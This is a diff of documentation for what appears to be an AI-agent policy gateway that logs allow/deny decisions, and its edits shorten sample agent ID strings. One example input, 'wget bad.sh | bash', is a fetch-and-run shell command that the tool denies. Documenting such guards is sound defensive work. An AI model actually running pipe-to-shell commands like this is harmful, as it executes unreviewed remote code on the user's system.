@@ -133,7 +133,7 @@ npx @openoba/rulsynor-core --tool=exec --cmd="wget bad.sh | bash"
 🛡️  Decision:   DENY
 📝 Reason:     Pipe-to-shell download blocked. Inspect the content with the read tool before executing.
 🧾 Recorded:   sha256:8274b0... (tamper-evident)
-🪪 Employee ID: 1.2.156.3088.1.000001.000001.5ce550e5
+🪪 Employee ID: 1.2.156.3088.1.000001.000001.5ce550
 📊 Jurisdiction: CN (GB/Z 185-2026 compliant)
 🧭 Alternative: Use the read tool to fetch the URL content first, then review before executing.
 ```
@@ -151,7 +151,7 @@ npx @openoba/rulsynor-core --tool=read --path="docs/api-spec.md"
 ✅ Decision:   ALLOW
 📝 Reason:     Read-only operation allowed.
 🧾 Recorded:   sha256:e71eb71... (tamper-evident)
-🪪 Employee ID: 1.2.156.3088.1.000001.000001.4ebf704b
+🪪 Employee ID: 1.2.156.3088.1.000001.000001.4ebf70
 📊 Jurisdiction: CN (GB/Z 185-2026 compliant)
 🧭 Alternative: —
 ```
@@ -434,7 +434,7 @@ const record = buildDecisionObject({
 
 // record.audit.hash            → "sha256:a1b2c3..." — immutable
 // record.audit.previous_hash   → previous DO's hash — chain verified
-// record.agent.aid             → "1.2.156.3088.1.000042.000003.a3f8c120"
+// record.agent.aid             → "1.2.156.3088.1.000042.000003.a3f8c1"
 // record.compliance_profile    → EU AI Act + GB/Z 185 fields activated
 // record.execution_trace_id    → UUID linking all steps in this task
 ```
